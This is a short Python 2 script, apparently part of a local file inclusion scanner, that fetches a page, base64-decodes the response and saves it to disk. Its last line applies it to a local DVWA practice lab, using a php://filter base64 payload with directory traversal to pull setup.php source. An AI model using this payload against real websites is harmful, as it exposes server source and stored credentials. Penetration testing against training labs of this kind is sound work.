import sys
sys.path.append('../..')
from config import *
from base64detechanddecode import *
from phpdetech import *
from httptruong import *
from urlparse import urlparse
import os
from taothumuc import *
from xacdinhfilename import *
def exportfile(url):
    o = urlparse(url)
    taothumuc(url)
    data = httptruong(url)
    a =  base64detechanddecode(data)
    
    b = DIR+"lfiscanner\\"+o.hostname+"\\"+xacdinhfilename(url)
    try:
        f = open(b,"w")
        f.write(a)
        f.close()
        
    except (RuntimeError, TypeError, NameError,IOError):
        print "[WARNING]: "+b +" is error, can not export"
        pass
exportfile("http://localhost/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../setup.php")
